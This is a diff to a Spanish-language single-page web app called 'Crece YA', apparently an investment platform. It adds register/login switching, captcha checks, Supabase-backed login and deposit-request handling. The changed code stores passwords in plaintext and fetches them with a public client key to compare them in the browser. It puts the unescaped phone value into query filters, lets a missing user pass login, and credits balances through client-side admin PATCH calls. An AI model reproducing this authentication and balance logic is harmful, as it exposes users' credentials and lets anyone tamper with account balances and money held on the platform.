@@ -62,13 +62,23 @@
 </head>
 <body class="bg-[#bae6fd] text-slate-850 antialiased min-h-screen p-0 sm:p-4 flex justify-center selection:bg-sky-500 selection:text-white">
 
-  <!-- PANTALLA DE ACCESO -->
+  <!-- PANTALLA DE ACCESO (REGISTRO / LOGIN DINÁMICO) -->
   <div id="auth-screen" style="position: fixed; inset: 0; z-index: 9999; background-color: rgba(6, 20, 36, 0.98); display: flex; align-items: center; justify-content: center; padding: 1rem;">
     <div class="w-full max-w-sm bg-[#0b1b2d] border border-sky-900/60 rounded-3xl p-6 shadow-2xl space-y-4 text-white">
       <div class="text-center space-y-2">
         <img src="./logo.png" alt="Crece YA" class="h-16 w-auto mx-auto object-contain">
         <h2 class="text-xl font-black tracking-wider pt-0.5">CRECE YA</h2>
         <p class="text-xs text-sky-300/80">Acceso Seguro a la Plataforma Bursátil</p>
+      </div>
+
+      <!-- Selector de Modo: Registrarse vs Iniciar Sesión -->
+      <div class="grid grid-cols-2 p-1 bg-[#13283f] rounded-xl text-xs font-bold">
+        <button id="tab-auth-register" type="button" onclick="setAuthMode('register')" class="py-2 rounded-lg bg-sky-500 text-slate-950 transition">
+          Registrarse
+        </button>
+        <button id="tab-auth-login" type="button" onclick="setAuthMode('login')" class="py-2 rounded-lg text-slate-400 hover:text-white transition">
+          Iniciar Sesión
+        </button>
       </div>
 
       <div class="space-y-3">
@@ -88,7 +98,7 @@
           </div>
         </div>
 
-        <div>
+        <div id="auth-confirm-box">
           <label class="text-xs text-slate-400 block mb-1">CONFIRMAR CONTRASEÑA</label>
           <div class="flex items-center bg-[#13283f] border border-sky-800/60 rounded-xl px-3 py-2.5 text-sm">
             <i class="fa-solid fa-lock-open text-sky-400 mr-2"></i>
@@ -96,7 +106,7 @@
           </div>
         </div>
 
-        <div>
+        <div id="auth-captcha-box">
           <label class="text-xs text-slate-400 block mb-1">CÓDIGO DE SEGURIDAD</label>
           <div class="grid grid-cols-2 gap-2">
             <div class="flex items-center justify-between bg-[#081320] border border-sky-800/80 rounded-xl px-3 py-2">
@@ -109,7 +119,7 @@
           </div>
         </div>
 
-        <button type="button" id="btn-submit-login" onclick="handleLoginDirecto()" class="w-full py-3 bg-sky-500 hover:bg-sky-400 active:scale-95 text-slate-950 font-black text-sm rounded-xl transition shadow-lg mt-2 cursor-pointer">
+        <button type="button" id="btn-submit-auth" onclick="handleAuthSubmit()" class="w-full py-3 bg-sky-500 hover:bg-sky-400 active:scale-95 text-slate-950 font-black text-sm rounded-xl transition shadow-lg mt-2 cursor-pointer">
           Ingresar al Mercado
         </button>
       </div>
@@ -496,7 +506,7 @@
 
   </main>
 
-  <!-- LÓGICA JAVASCRIPT GARANTIZADA -->
+  <!-- LÓGICA JAVASCRIPT SIN TRABAS Y CON LOGIN/REGISTRO INTELIGENTE -->
   <script>
     const SUPABASE_API_URL = "https://jsixgpftuhtepudyektf.supabase.co/rest/v1";
     const SUPABASE_PUBLISHABLE_KEY = "sb_publishable_1I5At-aenvWS_w6YhDLu9w_rkAeGHjL";
@@ -566,6 +576,30 @@
       appState.activePlans = JSON.parse(localStorage.getItem('cy_active_plans')) || [];
     } catch(e) {}
 
+    let authMode = 'register';
+    window.setAuthMode = function(mode) {
+      authMode = mode;
+      const btnReg = document.getElementById('tab-auth-register');
+      const btnLog = document.getElementById('tab-auth-login');
+      const confirmBox = document.getElementById('auth-confirm-box');
+      const captchaBox = document.getElementById('auth-captcha-box');
+      const submitBtn = document.getElementById('btn-submit-auth');
+
+      if (mode === 'login') {
+        btnLog.className = "py-2 rounded-lg bg-sky-500 text-slate-950 transition";
+        btnReg.className = "py-2 rounded-lg text-slate-400 hover:text-white transition";
+        confirmBox.classList.add('hidden');
+        captchaBox.classList.add('hidden');
+        submitBtn.innerText = "Iniciar Sesión";
+      } else {
+        btnReg.className = "py-2 rounded-lg bg-sky-500 text-slate-950 transition";
+        btnLog.className = "py-2 rounded-lg text-slate-400 hover:text-white transition";
+        confirmBox.classList.remove('hidden');
+        captchaBox.classList.remove('hidden');
+        submitBtn.innerText = "Registrarse e Ingresar";
+      }
+    };
+
     function applyTheme() {
       const icon = document.getElementById('theme-icon');
       if (appState.darkMode) {
@@ -612,6 +646,7 @@
       if (el) el.innerText = currentCaptcha;
     }
 
+    // PERSISTENCIA DE SESIÓN: SI YA EXISTE, NO VUELVE A MOSTRAR EL ACCESO
     function checkAuth() {
       const authScreen = document.getElementById('auth-screen');
       if (appState.phone && appState.pass) {
@@ -637,14 +672,15 @@
       }
     }
 
-    window.handleLoginDirecto = function() {
+    // GESTIÓN DE ACCESO (REGISTRO O LOGIN DIRECTO)
+    window.handleAuthSubmit = async function() {
       const phoneInput = document.getElementById('auth-phone');
       const passInput = document.getElementById('auth-pass');
       const passConfInput = document.getElementById('auth-pass-confirm');
+      const captchaInput = document.getElementById('auth-captcha-input');
 
       const phone = phoneInput ? phoneInput.value.trim() : '';
       const pass = passInput ? passInput.value : '';
-      const passConf = passConfInput ? passConfInput.value : '';
 
       if (!phone) {
         alert("Por favor ingresa tu número de teléfono.");
@@ -654,9 +690,32 @@
         alert("Por favor ingresa tu contraseña.");
         return;
       }
-      if (pass !== passConf) {
-        alert("Las contraseñas no coinciden.");
-        return;
+
+      if (authMode === 'register') {
+        const passConf = passConfInput ? passConfInput.value : '';
+        const capVal = captchaInput ? captchaInput.value.trim() : '';
+
+        if (pass !== passConf) {
+          alert("Las contraseñas no coinciden.");
+          return;
+        }
+        if (capVal !== currentCaptcha) {
+          alert("Código de seguridad incorrecto.");
+          return;
+        }
+      } else {
+        // Modo Login: Validar contra Supabase
+        const dbUsers = await supabaseRequest(`usuarios?phone=eq.${phone}&select=*`);
+        if (dbUsers && dbUsers.length > 0) {
+          if (dbUsers[0].pass !== pass) {
+            alert("Contraseña incorrecta.");
+            return;
+          }
+          appState.balance = parseFloat(dbUsers[0].balance) || 0;
+          appState.name = dbUsers[0].name || '';
+          appState.cvu = dbUsers[0].cvu || '';
+          appState.alias = dbUsers[0].alias || '';
+        }
       }
 
       appState.phone = phone;
@@ -668,6 +727,7 @@
       document.getElementById('user-display-phone').innerText = appState.phone;
       renderUI();
 
+      // Guardar / actualizar en Supabase
       supabaseRequest('usuarios', 'POST', {
         phone: phone,
         pass: pass,
@@ -906,7 +966,7 @@
 
     window.setDepositValue = (v) => document.getElementById('deposit-custom-input').value = v;
 
-    // ENVÍO DE RECARGA CON ESPERA GARANTIZADA ANTES DE ABRIR TELEGRAM
+    // ENVÍO GARANTIZADO DE SOLICITUD A SUPABASE CON ESPERA ANTES DE ABRIR TELEGRAM
     window.notifyDepositTelegram = async function() {
       const btn = document.getElementById('btn-notify-deposit');
       const val = parseFloat(document.getElementById('deposit-custom-input').value) || 2000;
@@ -928,8 +988,8 @@
         status: 'pendiente'
       };
 
-      // Guardar en Supabase
-      const res = await supabaseRequest('solicitudes', 'POST', solicitudItem);
+      // Guardar en Supabase esperando confirmación
+      await supabaseRequest('solicitudes', 'POST', solicitudItem);
 
       // Respaldo local
       try {
@@ -1043,7 +1103,7 @@
       }
     });
 
-    // LECTURA ROBUSTA: Supabase + Cola Local
+    // LECTURA DE SOLICITUDES EN LA CONSOLA
     window.cargarSolicitudesAdmin = async function() {
       const container = document.getElementById('admin-deposits-list');
       container.innerHTML = '<p class="text-xs text-purple-300 text-center py-6">Consultando solicitudes en vivo...</p>';
@@ -1054,7 +1114,6 @@
         if (Array.isArray(data)) list = data;
       } catch(e) {}
 
-      // Si Supabase aún no devolvió registros, usar cola local
       if (list.length === 0) {
         try {
           const localQueue = JSON.parse(localStorage.getItem('cy_solicitudes_queue') || '[]');
@@ -1104,7 +1163,7 @@
       // 2. Acreditar saldo en Supabase
       await supabaseRequest(`usuarios?phone=eq.${phone}`, 'PATCH', { balance: nuevoSaldo });
 
-      // 3. Marcar la solicitud como aprobada
+      // 3. Marcar solicitud como aprobada
       if (String(solicitudId).startsWith('LOC-')) {
         try {
           let localQueue = JSON.parse(localStorage.getItem('cy_solicitudes_queue') || '[]');
@@ -1115,7 +1174,6 @@
         await supabaseRequest(`solicitudes?id=eq.${solicitudId}`, 'PATCH', { status: 'aprobado' });
       }
 
-      // Si coincide con la sesión actual, reflejarlo de inmediato en pantalla
       if (appState.phone === phone) {
         appState.balance = nuevoSaldo;
         if (appState.pending >= amount) appState.pending -= amount;
